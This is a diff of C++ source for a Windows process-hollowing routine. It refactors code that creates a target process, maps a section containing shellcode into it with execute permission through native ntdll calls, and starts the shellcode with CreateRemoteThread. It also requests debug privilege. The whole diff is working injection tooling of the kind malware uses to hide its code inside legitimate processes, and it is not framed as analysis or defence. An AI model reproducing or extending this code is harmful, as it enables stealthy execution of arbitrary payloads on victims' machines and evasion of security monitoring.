@@ -2,6 +2,7 @@
 #include "define.h"
 #include "hklocal.h"
 #include "hkutil.h"
+#include "hktarget.h"
 
 bool hk_local::hollowTarget(DWORD PID) noexcept {
   if (!PID) {
@@ -20,9 +21,6 @@ bool hk_local::hollowTarget(DWORD PID) noexcept {
   ULONG retLength = 0;
   LUID privID{};
 
-  STARTUPINFOA startupInfo{};
-  PROCESS_INFORMATION procInfo{};
-  PROCESS_BASIC_INFORMATION procBasicInfo{};
   CONTEXT procContext{};
 
   // create function objects
@@ -35,9 +33,6 @@ bool hk_local::hollowTarget(DWORD PID) noexcept {
       (TSetContextThread)hk_util::procAddr("ntdll", "NtSetContextThread");
   TGetContextThread hkGetContextThread =
       (TGetContextThread)hk_util::procAddr("ntdll", "NtGetContextThread");
-  TQueryInformationProcess hkQueryInformationProcess =
-      (TQueryInformationProcess)hk_util::procAddr("ntdll",
-                                            "NtQueryInformationProcess");
 
   // UNUSED
   TCreateUserThread hkCreateUserThread =
@@ -46,21 +41,15 @@ bool hk_local::hollowTarget(DWORD PID) noexcept {
       (TResumeProcess)hk_util::procAddr("ntdll", "NtResumeProcess");
   //
 
-  LOGn("Setting debug privilege...\t\t");
+  //LOGn("Setting debug privilege...\t\t");
   if (hk_util::setLocalPrivilege("SeDebugPrivilege")) {  // unused right now
     //LOG("Failure.");
     //ERRCHK;
   };
   
-  LOG("SUCCESS.\nCreating suspended process '" << processPath << "'.");
-  if (!CreateProcessA(processPath, NULL, NULL, NULL, TRUE,
-                      CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL,
-                      &startupInfo, &procInfo)) {
-    LOG("ERROR: Failed to create process '" << processPath << "'.");
-    return false;
-  }
-  
-  LOG("SUCCESS! Created process with PID: " << procInfo.dwProcessId << ".");
+  LOG("Creating target process data structure.");
+
+  hkTarget hkTargetProc(processPath);
 
   LOG("Creating section at 0x" << std::hex << hkCreateSection << ", size "
                                << std::dec << sectionSize.QuadPart);
@@ -72,20 +61,22 @@ bool hk_local::hollowTarget(DWORD PID) noexcept {
                      NULL, &hk_util::shellCodeSize, 2, NULL, PAGE_READWRITE);
   LOG("Mapped local section view at 0x" << std::hex << lpSectionLocal);
 
-  LOG("Opening process with PID: " << std::dec << procInfo.dwProcessId << "...");
-  if (!OpenProcess(PROCESS_ALL_ACCESS, FALSE, procInfo.dwProcessId)) {
+  LOG("Opening process with PID: " << std::dec << hkTargetProc.dwProcessId()
+                                   << "...");
+  if (!OpenProcess(PROCESS_ALL_ACCESS, FALSE, hkTargetProc.dwProcessId())) {
     LOG("ERROR: Failed to open process with ID: " << PID << ". Error code: " << GetLastError());
-    TerminateProcess(procInfo.hProcess, 0);
+    TerminateProcess(hkTargetProc.hProcess(), 0);
     return false;
   }
   
   LOG("Mapping target section view...");
-  if(hkMapViewOfSection(hSection, procInfo.hProcess, &lpSectionTarget, NULL, NULL, NULL,
+  if (hkMapViewOfSection(hSection, hkTargetProc.hProcess(), &lpSectionTarget,
+                         NULL, NULL, NULL,
                          &hk_util::shellCodeSize, 2, NULL,
                          PAGE_EXECUTE_READ) != 0) {
     LOG("ERROR: failed to map target section view. Error code: "
         << GetLastError());
-    TerminateProcess(procInfo.hProcess, 0);
+    TerminateProcess(hkTargetProc.hProcess(), 0);
     return false;
   };
 
@@ -101,21 +92,17 @@ bool hk_local::hollowTarget(DWORD PID) noexcept {
 
   LOG("Executing shellcode at 0x" << std::hex << lpSectionTarget << ".");
 
-  hRThread = CreateRemoteThread(procInfo.hProcess, nullptr, 0,
+  hRThread = CreateRemoteThread(hkTargetProc.hProcess(), nullptr, 0,
                                 (LPTHREAD_START_ROUTINE)lpSectionTarget,
                                 nullptr, 0, &idRThread);
   
   procContext.ContextFlags = CONTEXT_FULL;
-  hkGetContextThread(procInfo.hThread, &procContext);
-
-  hkQueryInformationProcess(procInfo.hProcess, ProcessBasicInformation,
-                            &procBasicInfo, sizeof(PROCESS_BASIC_INFORMATION),
-                            &retLength);
+  hkGetContextThread(hkTargetProc.hThread(), &procContext);
 
   // cleanup
   _getch();
   CloseHandle(hRThread);
-  TerminateProcess(procInfo.hProcess, 0);
+  TerminateProcess(hkTargetProc.hProcess(), 0);
 
   return true;
 }
